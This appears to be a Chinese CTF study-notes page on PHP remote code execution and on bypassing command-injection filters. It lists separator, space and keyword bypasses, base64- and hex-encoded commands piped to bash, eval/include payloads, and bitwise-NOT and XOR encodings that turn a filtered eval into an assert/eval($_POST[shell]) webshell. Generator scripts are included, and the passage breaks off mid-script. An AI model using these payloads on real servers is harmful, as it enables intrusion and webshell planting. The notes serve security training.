title="代码执行函数"></a>代码执行函数</h2><blockquote><p>eval()：将字符串作为php代码执行；</p><p>assert()：将字符串作为php代码执行；</p><p>preg_replace()：正则匹配替换字符串；</p><p>create_function()：主要创建匿名函数；</p><p>call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p><p>call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p><p>可变函数： 若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数   </p><p>​         执行</p></blockquote><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><p>Linux:</p><table><thead><tr><th>管道符</th><th>实例</th><th>描述</th></tr></thead><tbody><tr><td>;</td><td>A;B</td><td>无论真假，A与B都执行</td></tr><tr><td>&amp;</td><td>A&amp;B</td><td>无论真假，A与B都执行</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>A为真时才执行B，否则只执行A</td></tr><tr><td>|</td><td>A|B</td><td>显示B的执行结果</td></tr><tr><td>||</td><td>A||B</td><td>A为假时才执行B，否则只执行A</td></tr></tbody></table><p>Windows:</p><table><thead><tr><th>管道符</th><th>实例</th><th>描述</th></tr></thead><tbody><tr><td>|</td><td>A|B</td><td>显示B的执行结果</td></tr><tr><td>||</td><td>A||B</td><td>A为假时才执行B，否则只执行A</td></tr><tr><td>&amp;</td><td>A&amp;B</td><td>无论真假，A与B都执行</td></tr><tr><td>&amp;&amp;</td><td>A&amp;&amp;B</td><td>A为真时才执行B，否则只执行A</td></tr></tbody></table><h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><table><thead><tr><th>以下可代替空格</th><th></th><th></th></tr></thead><tbody><tr><td>&lt;</td><td>&lt;&gt;</td><td>%20(即space)</td></tr><tr><td>%09(即tab)</td><td><code>$IFS$9</code></td><td>${IFS}</td></tr><tr><td>$IFS</td><td>{cat,&#x2F;flag}</td><td></td></tr></tbody></table><p><code>$IFS</code>在linux下表示分隔符，但是如果单纯的<code>cat$IFS2</code>，bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，因此这里加一个{}就固定了变量名。<br>同理，在后面加个<code>$</code>可以起到截断的作用，使用<code>$9</code>是因为它是当前系统shell进程的第九个参数的持有者，它始终为空字符串。</p><h3 id="关键字过滤"><a href="#关键字过滤" class="headerlink" title="关键字过滤"></a>关键字过滤</h3><p>比如说禁用了cat ls flag等</p><p><strong>\绕过</strong></p><blockquote><p>c\at &#x2F;flag</p><p>l\s &#x2F;</p></blockquote><p><strong>单引号绕过</strong></p><blockquote><p>c’’at flag</p><p>l’’s &#x2F;</p></blockquote><p><strong>双引号绕过</strong> </p><blockquote><p>c””at flag</p><p>l””s &#x2F;</p></blockquote><p><strong>Shell 特殊变量绕过</strong></p><blockquote><p>ca$@t flag</p></blockquote><p><strong>变量拼接</strong></p><blockquote><p>b&#x3D;ag</p><p>cat &#x2F;fl$b</p></blockquote><p><strong>读flag</strong></p><blockquote><p>eval(var_dump(file_get_contents($_POST[‘a’])););&amp;a&#x3D;&#x2F;flag</p></blockquote><p><strong>_过滤</strong></p><blockquote><p>php8以下，变量名中的第一个非法字符[会被替换为下划线_</p><p>e_v.a.l&#x3D;&#x3D;&gt;e[v.a.l</p></blockquote><p><strong>php标签过滤</strong></p><p><code>?&gt;&lt;?= phpinfo(); ?&gt;</code></p><p><code>&lt;? ?&gt;等价于&lt;?php ?&gt;</code></p><p><code>&lt;?= &gt;等价于&lt;?php echo ?&gt;</code></p><p><strong>编码绕过</strong></p><p>可以使用各种编码进行绕过</p><blockquote><p>base64编码绕过,编码cat &#x2F;flag，反引号、| bash、<code>$()</code>用于执行系统命令<br>echo Y2F0IC9mbGFn | base64 -d&#96;<br>echo Y2F0IC9mbGFn | base64 -d | bash<br>$(echo Y2F0IC9mbGFn | base64 -d)</p><p>hex编码绕过，编码cat &#x2F;flag,| bash用于执行系统命令<br>echo ‘636174202f666c6167’ | xxd -r -p | bash</p><p>shellcode编码<br>十六进制编码</p></blockquote><p><strong>正则匹配的绕过</strong></p><blockquote><p>cat &#x2F;f???</p><p>cat &#x2F;fl*</p><p>cat &#x2F;f[a-z]{3}</p></blockquote><h3 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h3><h4 id="cat替换命令"><a href="#cat替换命令" class="headerlink" title="cat替换命令"></a>cat替换命令</h4><table><thead><tr><th>more</th><th>less</th><th>cat</th><th>tac</th></tr></thead><tbody><tr><td>head</td><td>tail</td><td>vi</td><td>vim</td></tr><tr><td>nl</td><td>od</td><td>sort</td><td>uniq</td></tr></tbody></table><table><thead><tr><th>tac</th><th>与cat相反，按行反向输出</th></tr></thead><tbody><tr><td>more</td><td>按页显示，用于文件内容较多且不能滚动屏幕时查看文件</td></tr><tr><td>less</td><td>与more类似</td></tr><tr><td>tail</td><td>查看文件末几行</td></tr><tr><td>head</td><td>查看文件首几行</td></tr><tr><td>nl</td><td>在cat查看文件的基础上显示行号</td></tr><tr><td>od</td><td>以二进制方式读文件，od -A d -c &#x2F;flag转人可读字符</td></tr><tr><td>xxd</td><td>以二进制方式读文件，同时有可读字符显示</td></tr><tr><td>sort</td><td>排序文件</td></tr><tr><td>uniq</td><td>报告或删除文件的重复行</td></tr></tbody></table><table><thead><tr><th>file</th><th>报错文件内容</th></tr></thead><tbody><tr><td>grep</td><td>过滤查找字符串，grep flag &#x2F;flag</td></tr></tbody></table><h4 id="回溯绕过"><a href="#回溯绕过" class="headerlink" title="回溯绕过"></a>回溯绕过</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//php正则的回溯次数大于1000000次时返回False</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;hello world&#x27;</span>+<span class="string">&#x27;h&#x27;</span>*<span class="number">1000000</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/hello.*world/is&quot;</span>,<span class="variable">$a</span>) == False</span><br></pre></td></tr></table></figure><h4 id="函数绕过"><a href="#函数绕过" class="headerlink" title="函数绕过"></a>函数绕过</h4><p><img src="https://bu.dusays.com/2024/05/13/664161d1796e4.png" alt="image-20240329233618962"></p><p><code>system(current(getallheaders()));</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gettallheaders()将报文头信息转为数组返回</span><br><span class="line">current（）将数组当前元素返回（默认指向第一个元素）</span><br><span class="line">因此我们只需在报文头最前面添加一个执行命令即可</span><br></pre></td></tr></table></figure><p><code>passthru</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">例如：eval(&#x27;echo &#x27;.$str.&#x27;;&#x27;);</span><br><span class="line"></span><br><span class="line">$Str=passthru（chr(108).chr(115).chr(32).chr(47)）;(等于`ls /`)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>scandir</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(chr(47)));       （chr(47)==/,该命令会显示根目录下的文件）</span><br><span class="line"></span><br><span class="line">var_dump(scandir(‘./’)) 查看上级目录来查看当前文件名</span><br><span class="line">eval(var_dump(scandir(&#x27;/&#x27;););读根目录：</span><br></pre></td></tr></table></figure><p><code>glob</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob(&quot;*&quot;)  匹配任意文件</span><br><span class="line">glob(&quot;*.txt&quot;)  匹配以txt为后缀的文件</span><br><span class="line"></span><br><span class="line">所以也可以使用：</span><br><span class="line">?cmd=print_r(glob(&quot;*&quot;));</span><br></pre></td></tr></table></figure><h4 id="嵌套绕过"><a href="#嵌套绕过" class="headerlink" title="嵌套绕过"></a>嵌套绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">？c=eval($_GET[1]);&amp;1=system(&#x27;tac flag.php&#x27;);</span><br><span class="line"></span><br><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br><span class="line">还有get_defined_vars()的形式</span><br><span class="line"></span><br><span class="line">?c=include/require$_GET[1];&amp;1=php://filter/convert.base64-encode/resource=flag.php   伪协议的嵌套</span><br></pre></td></tr></table></figure><h4 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h4><p>假如过滤分号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">那么可以直接 ?&gt; 闭合php（ ?&gt; 闭合的是eval里面的php语句，eval后续还有语句的话，依旧是会执行的。除此以外，php代码最后一句可以不用加分号，可以绕过分号的过滤）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">如下面代码所示</span><br><span class="line">?c=include$_GET[&quot;a&quot;]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><h4 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h4><p>preg_match()遇到数组会直接返回flase。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a[]=&#x27;flag.php&#x27;;</span><br><span class="line">     </span><br><span class="line">$a=array(&#x27;flag.php&#x27;);</span><br><span class="line">     </span><br><span class="line">$a=[&#x27;flag.php&#x27;];</span><br></pre></td></tr></table></figure><h3 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h3><p>取反符号~，用的字符不会触发正则表达式</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//取反传参</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$b</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出得到取反传参内容</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;?cmd=(~&quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;)(~&quot;</span>.<span class="variable">$d</span>.<span class="string">&quot;);&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  <span class="comment">//在命令行中运行</span></span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line">    <span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line">    <span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果要<strong>绕过正则RCE</strong>，我们可以采用url取反绕过，如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br><span class="line"># %8F%97%8F%96%91%99%90 : phpinfo</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664161ccaf36c.png" alt="image-20240330111337425"></p><ul><li><p>这里还利用了一点是：对于PHP，形如 <code>(func_name)()</code>，其中func_name可以是字符串，会执行这个func</p></li><li><p>这里相当于执行了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">phpinfo()</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://bu.dusays.com/2024/05/13/664161cd91713.png" alt="image-20240330112128952"></p><p>但是</p><p>上述代码取反后应该是(system)(ls); 并不是正常的system(ls);</p><p>所以如果直接执行phpinfo() 是不会被执行的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90%D7%D6);</span><br><span class="line"># %8F%97%8F%96%91%99%90%D7%D6 : phpinfo()</span><br></pre></td></tr></table></figure><ul><li>当 <code>(~%8F%97%8F%96%91%99%90%D7%D6);</code>被当作代码执行时的第一步就是取反操作 <code>~</code></li><li>但是取反得到的字符串 <code>phpinfo()</code>并不会被当作代码执行，因为在取反之前PHP解释器并不知道这原来是 <code>phpinfo()</code></li></ul><p>所以：</p><p><strong>对于已知过滤条件，想要执行我们指定的代码，必须有 <code>(func_name)()</code>这样的形式</strong></p><p>那么想用蚁剑这样的工具的话，需要让其执行我们POST提交的数据，由问题1可以知道，若构造：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</span><br><span class="line"># %DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2 : $_POST[shell]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样是不能得到执行结果的</p><p>以<code>(func_name)()</code>这样的形式，去执行 <code>(&quot;assert&quot;)(&quot;$_POST[shell]&quot;)</code> 构造payload：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2 : $_POST[shell]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是也是执行不成功</p><p>原因：</p><ol><li>第一层eval：首先 <code>(~%9E%8C%8C%9A%8D%8B)(~%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2);</code> 先会执行取反函数，得到 <code>(&quot;assert&quot;)(&quot;$_POST[shell]&quot;)</code></li><li>第二层assert：注意第二个括号里其实还是字符串，并不是真正的 <code>$_POST[shell]</code> 代码。PHP在解释的时候会找到名为assert的函数，assert会把 <code>$_POST[shell]</code> 变成真正的PHP代码。也就是说现在可以传参过来了，但是却没有执行。</li></ol><p>那么要想要执行 <code>$_POST[shell]</code>，还要在在前面追加一个 <code>eval</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</span><br><span class="line"># %9E%8C%8C%9A%8D%8B : assert</span><br><span class="line"># %9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6 : eval($_POST[shell])</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以执行</p><ol><li>第一层eval：首先 <code>(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6);</code> 先会执行取反函数，得到 <code>(&quot;assert&quot;)(&quot;eval($_POST[shell])&quot;)</code></li><li>第二层assert：将字符串 <code>&quot;eval($_POST[shell])&quot;</code> 看作php代码执行</li><li>第三层eval：将 <code>$_POST[shell]</code> 传来的数据看作代码执行</li></ol><h3 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h3><p>在 PHP 中两个字符串异或之后，得到的还是一个字符串。原理是转换为二进制进行异或。如果正则匹配过滤了字母和数字，那就可以使用两个不在正则匹配范围内的非字母非数字的字符进行异或，从而得到我们想要的字符串。</p><p>异或（XOR）是一种逻辑运算，它的原理如下：</p><p>符号表示： 异或运算用符号 ^ 表示。</p><p>定义： 对于两个二进制位，如果相应位相同则结果为 0，如果相应位不同则结果为 1。</p><p>下面是异或运算的真值表：</p><table><thead><tr><th>A</th><th>B</th><th>A XOR B</th></tr></thead><tbody><tr><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td></tr></tbody></table><p>对于整个二进制数，异或运算会对每一位进行独立的操作。</p><p>异或的性质：</p><blockquote><p>交换律： A XOR B 等于 B XOR A<br>结合律： (A XOR B) XOR C 等于 A XOR (B XOR C)<br>自反性： A XOR A 等于 0<br>零元素： A XOR 0 等于 A</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 异或构造Python脚本</span></span><br><span class="line">valid = <span class="string">&quot;1234567890!@$%^*()&#123;&#125;[];\&#x27;\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class="line"> </span><br><span class="line">answer = <span class="built_in">input</span>(<span class="string">&#x27;输入异或构造的字符串:&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">tmp1, tmp2 = <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> answer:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> valid:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> valid:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(c):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;&quot;<span class="subst">&#123;tmp1&#125;</span>&quot;^&quot;<span class="subst">&#123;tmp2&#125;</span>&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">phpinfo <span class="string">&quot;0302181&quot;</span>^<span class="string">&quot;@[@[_^^&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//异或php脚本</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;%&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$a</span>[<span class="variable">$i</span>])^<span class="number">0xff</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;^&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$j</span>++)</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;%ff&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//输出：%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;res.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    <span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">      <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">          <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">          <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">          <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">        <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">        <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)^<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">          <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><p>先用该脚本生成所有字符异或后的结果，用于下一个脚本的使用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">import</span> urllib</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line">       s1=<span class="string">&quot;&quot;</span></span><br><span class="line">       s2=<span class="string">&quot;&quot;</span></span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">           f=<span class="built_in">open</span>(<span class="string">&quot;res.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">           <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">               t=f.readline()</span><br><span class="line">               <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">                   <span class="keyword">break</span></span><br><span class="line">               <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">                   <span class="comment">#print(i)</span></span><br><span class="line">                   s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                   s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                   <span class="keyword">break</span></span><br><span class="line">           f.close()</span><br><span class="line">       output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">       <span class="keyword">return</span>(output)</span><br><span class="line">       </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">       param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">       <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 命令行运行:php yihuo.php</span></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span 